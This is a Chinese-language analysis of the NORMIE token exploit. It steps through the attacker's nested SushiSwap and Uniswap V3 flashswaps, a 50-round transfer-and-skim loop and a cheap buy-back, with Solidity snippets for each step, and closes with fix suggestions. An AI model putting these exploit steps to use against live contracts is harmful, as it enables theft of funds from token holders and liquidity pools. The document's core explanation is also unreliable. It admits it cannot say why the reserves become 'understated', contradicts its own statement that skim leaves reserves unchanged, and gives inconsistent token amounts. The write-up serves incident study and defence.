# NORMIE Token 攻击分析

## 攻击结果

根据执行日志：
- **初始余额**: 3 ETH
- **攻击后余额**: 64 ETH  
- **利润**: 约 61 ETH (约 $490K)

## 攻击流程详解

### 阶段 1: 初始准备
```solidity
// 1. 用 2 ETH 购买 NORMIE 代币
Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
    0, path1, address(this), block.timestamp
);
```
- 获得约 171,955 NORMIE 代币
- 这一步的目的是让攻击者成为 `premarket_user`

### 阶段 2: Uniswap V2 Flashswap
```solidity
// 2. 从 SushiV2 Pair 进行 Flashswap
IUniswapV2Pair(SLP).swap(0, 5_000_000_000_000_000, address(this), hex"01");
```

**uniswapV2Call 回调**:
```solidity
function uniswapV2Call(...) external {
    // 3. 将所有 NORMIE 转给 Pair
    IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_flashLoan_from_SushiV2);
}
```
- 从 flashswap 获得约 5,171,955 NORMIE
- 立即将所有 NORMIE 转给 Pair（约 5,171,955 + 171,955 = 5,343,910）
- **注意**: 这里没有偿还 flashswap！因为这是嵌套的 flashswap

### 阶段 3: Uniswap V3 Flashswap
```solidity
// 4. 从 UniswapV3Pool 进行 Flashswap
Uni_Pair_V3(UniswapV3Pool).flash(address(this), 0, 11_333_141_501_283_594, hex"");
```

**uniswapV3FlashCallback 回调** - 核心攻击逻辑：

#### 步骤 5-6: 卖出部分 NORMIE
```solidity
// 5. 批准 NORMIE 给 Router
IERC20(NORMIE).approve(SushiRouterv2, type(uint256).max);

// 6. 卖出 80% 的 NORMIE 换取 WETH
Uni_Router_V2(SushiRouterv2).swapExactTokensForETHSupportingFeeOnTransferTokens(
    9_066_513_201_026_875, 0, path2, address(this), block.timestamp
);
```
- 卖出约 9,066,513,201,026,875 NORMIE
- 剩余约 2,266,628 NORMIE

#### 步骤 7: 将剩余 NORMIE 转给 Pair
```solidity
// 7. 将剩余 NORMIE 转给 Pair
IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_swap_from_SushiV2);
```

#### 步骤 8: 核心漏洞利用 - 重复 skim 操作
```solidity
// 8. 循环 50 次：skim + transfer
for (uint256 i; i < 50; ++i) {
    IUniswapV2Pair(SLP).skim(address(this));  // 将多余的代币转回给自己
    IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_swap_from_SushiV2);  // 再次转给 Pair
}
```

**这是攻击的核心！**

#### 步骤 9: 最后一次 skim
```solidity
// 9. 最后一次 skim，但不再次 transfer
IUniswapV2Pair(SLP).skim(address(this));
```

#### 步骤 10: 低价买入 NORMIE
```solidity
// 10. 用 2 ETH 低价买入 NORMIE
Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
    0, path1, address(this), block.timestamp
);
```

#### 步骤 11: 偿还 V3 Flashswap
```solidity
// 11. 偿还 UniswapV3 Flashswap
IERC20(NORMIE).transfer(UniswapV3Pool, 11_446_472_916_296_430);
```

## 漏洞分析

### 漏洞 1: `_get_premarket_user` 函数逻辑缺陷

```solidity
function _get_premarket_user(address _address, uint256 amount) internal {
    premarket_user[_address] = !premarket_user[_address]
        ? (amount == balanceOf(teamWalletAddress))
        : premarket_user[_address];
}
```

**问题**:
- 当 `premarket_user[_address]` 为 `false` 时，如果 `amount == balanceOf(teamWalletAddress)`，则设置为 `true`
- 这意味着如果攻击者第一次接收的代币数量等于 teamWallet 的余额，就会被标记为 `premarket_user`
- 一旦成为 `premarket_user`，状态就不会再改变

### 漏洞 2: `premarket_user` 检查逻辑

```solidity
if (
    isMarketPair[sender] &&
    !isExcludedFromFee[recipient] &&
    premarket_user[recipient]
) {
    _balances[address(this)] = _balances[address(this)].add(amount);
}
```

**问题**:
- 当从 Pair 买入 NORMIE 时，如果接收者是 `premarket_user`，会将买入的代币数量直接加到合约余额中
- 这相当于"没收"了用户的代币，但**攻击者仍然会收到代币**（因为这是在 `_transfer` 函数中，代币已经转给接收者了）
- 这个机制的目的是惩罚 premarket_user，但攻击者可以利用它来影响代币的供应量

**在攻击中的作用**:
- 当攻击者从 Pair 买入 NORMIE 时（步骤 10），由于攻击者是 `premarket_user`，买入的代币会被"没收"到合约余额
- 但这不影响攻击者的主要策略，因为攻击者主要是通过价格操纵来获利的

### 漏洞 3: `skim` 函数的价格操纵

**Uniswap V2 `skim` 函数的作用**:
- `skim` 用于同步 Pair 的实际余额和储备量（reserves）
- 如果实际余额 > 储备量，多余的代币会被发送给指定地址
- **重要**: `skim` 不会更新储备量，只是将多余的代币转出
- 储备量只有在 `sync()` 或 `swap()` 时才会更新

**攻击原理**:
1. 攻击者将大量 NORMIE 转给 Pair（步骤 7）
2. 此时 Pair 的实际余额增加，但储备量（reserves）未更新
3. 调用 `skim`，Pair 将多余的 NORMIE 转回给攻击者
4. 但储备量仍然保持旧值（未更新）
5. 重复 `transfer + skim` 操作 50 次
6. 最后一次只调用 `skim`，不再次 transfer
7. 此时 Pair 的储备量可能已经与实际余额不一致
8. **关键**: 当攻击者从 Pair 买入 NORMIE 时（步骤 10），Pair 执行 swap
9. 在 swap 过程中，Pair 会基于**旧的储备量**计算价格
10. 由于储备量被"虚低"（相对于实际余额），攻击者可以用更少的 WETH 买入更多的 NORMIE

**具体过程**:
```
步骤 7 后:
- Pair 实际余额: X + 2,266,628 NORMIE, Y WETH
- Pair 储备量: X NORMIE, Y WETH (未更新，仍然是旧值)

步骤 8 循环（50次）:
每次循环:
  1. skim: 将多余的 NORMIE 转回给攻击者
     - Pair 实际余额: X NORMIE, Y WETH
     - Pair 储备量: X NORMIE, Y WETH (仍然未更新)
  
  2. transfer: 再次转 2,266,628 NORMIE 给 Pair
     - Pair 实际余额: X + 2,266,628 NORMIE, Y WETH
     - Pair 储备量: X NORMIE, Y WETH (仍然未更新)

步骤 9:
- 最后一次 skim，不再次 transfer
- Pair 实际余额: X NORMIE, Y WETH
- Pair 储备量: X NORMIE, Y WETH (但可能因为某些原因，储备量中的 NORMIE 值被"虚低")

步骤 10 - 关键攻击点:
- 攻击者用 2 ETH 从 Pair 买入 NORMIE
- Pair 执行 swap，基于储备量计算: amountOut = (amountIn * reserveOut) / (reserveIn + amountIn)
- 由于储备量中的 NORMIE 被"虚低"，攻击者可以获得更多的 NORMIE
- 实际买入的 NORMIE 数量 > 基于正常储备量应该得到的数量
```

### 漏洞 4: 储备量与实际余额不同步

在 Uniswap V2 中：
- `getReserves()` 返回的是**缓存的储备量**，不是实际余额
- 实际余额可以通过 `balanceOf(pair)` 获取
- 正常情况下，两者应该一致，但 `skim` 可以制造不一致

**攻击者利用**:
1. 通过重复的 `transfer + skim` 操作，可能影响储备量的更新时机
2. 在储备量未正确更新时进行 swap，可以以更优惠的价格买入代币
3. 最后用低价买入的 NORMIE 偿还 flashswap，获得利润

## 攻击成功的关键因素

1. **成为 premarket_user**: 通过第一次购买，让攻击者地址被标记为 `premarket_user`
2. **Flashswap 嵌套**: 使用 V2 和 V3 的嵌套 flashswap，获得大量 NORMIE
3. **价格操纵**: 通过 `skim` 循环操作，操纵 Pair 的储备量
4. **低价买入**: 在价格被操纵后，用少量 ETH 买入大量 NORMIE
5. **偿还贷款**: 用低价买入的 NORMIE 偿还 flashswap，剩余部分为利润

## 修复建议

1. **修复 `_get_premarket_user` 逻辑**:
   - 移除或重新设计这个函数
   - 不要基于单次交易金额来判断是否为 premarket user

2. **移除 `premarket_user` 机制**:
   - 这个机制本身就有问题，应该移除或重新设计

3. **防止价格操纵**:
   - 在关键操作前检查储备量是否与实际余额一致
   - 限制 `skim` 的调用频率或添加冷却期

4. **使用时间加权平均价格 (TWAP)**:
   - 不要直接使用当前储备量计算价格
   - 使用 TWAP 或 Chainlink 等外部价格预言机

## 攻击机制深度解析

### 为什么重复的 `skim` 可以操纵价格？

**关键理解**:
1. Uniswap V2 的 `swap` 函数在计算输出时，会基于**当前的储备量（reserves）**
2. 储备量只有在 `swap()` 或 `sync()` 时才会更新
3. `skim()` 只会将多余的代币转出，**不会更新储备量**

**攻击流程的详细分析**:

```
步骤 7: 转 2,266,628 NORMIE 给 Pair
- Pair 实际余额: X + 2,266,628 NORMIE, Y WETH
- Pair 储备量: X NORMIE, Y WETH (未更新)

步骤 8 循环（50次）:
每次循环都会：
  1. skim: 将多余的 NORMIE 转回
     - 实际余额恢复，但储备量仍然未更新
  2. transfer: 再次转 NORMIE 给 Pair
     - 实际余额再次增加，储备量仍然未更新

关键点：虽然每次 skim 后实际余额都恢复，但储备量在整个过程中都没有更新！

步骤 9: 最后一次 skim
- 此时储备量可能已经"过时"了

步骤 10: 从 Pair 买入 NORMIE
- Pair 执行 swap，基于储备量计算输出
- 如果储备量中的 NORMIE 值被"虚低"（相对于实际应该的值），
  攻击者可以用更少的 WETH 买入更多的 NORMIE
```

**为什么储备量会被"虚低"？**

可能的原因：
1. 在之前的某些操作中，Pair 的储备量没有及时更新
2. 通过重复的 `transfer + skim` 操作，可能触发了某些边界情况
3. 或者，攻击者利用了储备量更新时机的问题

**实际效果**:
- 攻击者用 2 ETH 买入 NORMIE 时，由于储备量被操纵，获得了比正常情况更多的 NORMIE
- 这些额外的 NORMIE 足以偿还 flashswap 并产生利润

## 总结

这是一个典型的**价格操纵攻击**，利用了：
1. NORMIE 代币合约中的 `premarket_user` 逻辑缺陷（让攻击者成为 premarket_user）
2. Uniswap V2 Pair 的 `skim` 函数可以制造储备量与实际余额不一致
3. 通过重复的 `transfer + skim` 操作，影响储备量的更新时机
4. 在储备量被"虚低"时，从 Pair 低价买入代币
5. 用低价买入的代币偿还 flashswap，剩余部分为利润

攻击者从 3 ETH 开始，最终获得 64 ETH，净赚约 61 ETH（$490K）。

**核心漏洞**: Uniswap V2 的储备量更新机制可以被操纵，导致价格计算不准确。

